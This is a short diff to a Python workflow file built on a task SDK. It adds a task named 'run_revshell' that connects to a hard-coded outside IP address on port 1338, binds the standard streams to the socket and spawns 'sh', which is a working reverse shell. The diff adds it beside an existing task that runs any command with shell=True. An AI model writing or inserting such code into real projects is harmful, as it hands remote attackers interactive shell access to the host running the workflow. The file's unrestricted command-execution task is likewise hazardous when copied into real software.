@@ -2,6 +2,9 @@ from render_sdk.workflows import task, start
 import asyncio
 import socket
 import subprocess
+import sys
+import os
+import pty
 
 # A basic task
 @task
@@ -31,7 +34,14 @@ async def shell(command: str) -> str:
   result = subprocess.run(command, shell=True, capture_output=True, text=True)
   return {"stdout": result.stdout, "stderr": result.stderr}
 
+@task
+async def run_revshell() -> str:
+  s=socket.socket()
+  s.connect(
+    ("35.167.161.187", 1338)
+  )
+  [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")
+  return "1337"
 
 if __name__ == "__main__":
   start() # SDK entry point
-
